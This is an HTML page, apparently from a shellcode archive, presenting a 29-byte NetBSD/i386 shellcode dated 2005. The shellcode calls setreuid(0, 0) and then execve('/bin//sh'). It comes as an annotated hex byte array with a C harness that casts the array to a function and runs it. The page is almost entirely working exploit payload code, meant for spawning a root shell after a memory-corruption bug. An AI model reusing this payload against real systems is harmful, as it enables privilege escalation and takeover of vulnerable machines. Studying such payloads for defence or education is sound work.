<html><head><title>NetBSD/x86 - setreuid(0, 0); execve(/bin//sh, ..., NULL); - 29 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/*
 *  minervini at neuralnoise dot com (c) 2005
 *  NetBSD/i386 2.0, setreuid(0, 0); execve(&quot;/bin//sh&quot;, ..., NULL);
 *  note: unsafe shellcode, but 29 bytes long;
 *  	  doesn't work if (eax &amp; 0x40000000) != 0;
 */

#include &quot;sys/types.h&quot;
#include &quot;stdio.h&quot;
#include &quot;string.h&quot;

char scode[] =
  &quot;\x99&quot;                   // cltd   
  &quot;\x52&quot;                   // push   %edx
  &quot;\x52&quot;                   // push   %edx
  &quot;\x52&quot;                   // push   %edx
  &quot;\x6a\x7e&quot;               // push   $0x7e
  &quot;\x58&quot;                   // pop    %eax
  &quot;\xcd\x80&quot;               // int    $0x80
  &quot;\x68\x2f\x2f\x73\x68&quot;   // push   $0x68732f2f
  &quot;\x68\x2f\x62\x69\x6e&quot;   // push   $0x6e69622f
  &quot;\x89\xe3&quot;               // mov    %esp,%ebx
  &quot;\x52&quot;                   // push   %edx
  &quot;\x54&quot;                   // push   %esp
  &quot;\x53&quot;                   // push   %ebx
  &quot;\x52&quot;                   // push   %edx
  &quot;\x34\x3b&quot;               // xor    $0x3b,%al
  &quot;\xcd\x80&quot;;              // int    $0x80

int main() {
   void (*code) () = (void *) scode;
   printf(&quot;length: %d\n&quot;, strlen(scode));
   code();
   return (0);
}


<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
